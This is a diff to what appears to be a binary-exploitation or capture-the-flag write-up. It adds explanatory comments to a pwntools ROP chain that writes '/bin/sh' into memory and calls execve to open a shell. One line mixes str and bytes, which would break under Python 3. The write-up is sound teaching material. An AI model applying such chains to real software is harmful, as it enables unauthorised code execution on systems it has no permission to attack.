@@ -49,29 +49,29 @@ we pick somewhere in a rw section to place our string and craft a rop chain usin
 ```python
 str_dest=0x006b6208  # someplace in a rw section
 
-exploit=b'A'*72
+exploit=b'A'*72 # padding
 exploit+=p64(SET_RDX_RSI)
-exploit+=b'/bin\x00\x00\x00\x00'
+exploit+=b'/bin\x00\x00\x00\x00' # set rdx to start of string
 exploit+=p64(0x41414141)
 exploit+=p64(SET_RAX)
-exploit+=p64(str_dest)
-exploit+=p64(WRITE_EDX_RAX)
+exploit+=p64(str_dest) # rax to set addr
+exploit+=p64(WRITE_EDX_RAX) # write mem
 exploit+=p64(SET_RDX_RSI)
-exploit+=b'/sh\x00\x00\x00\x00\x00'
+exploit+=b'/sh\x00\x00\x00\x00\x00' # last part of string...
 exploit+=p64(0x41414141)
 exploit+=p64(SET_RAX)
 exploit+=p64(str_dest+4)
-exploit+=p64(WRITE_EDX_RAX)
+exploit+=p64(WRITE_EDX_RAX) # full string written
 
 
-exploit+=p64(SET_RDX_RSI)
+exploit+=p64(SET_RDX_RSI) # set up params...
 exploit+=p64(0x0)
 exploit+=p64(0x0)
 exploit+=p64(SET_RDI)
 exploit+=p64(str_dest)
 exploit+=p64(SET_RAX)
-exploit+=chr(0x3b)+"\x00"*7
-exploit+=p64(SYSCALL)
+exploit+=chr(0x3b)+"\x00"*7 # rax=0x3b
+exploit+=p64(SYSCALL) # make the syscall
 
 r.sendline(exploit)
 r.interactive()
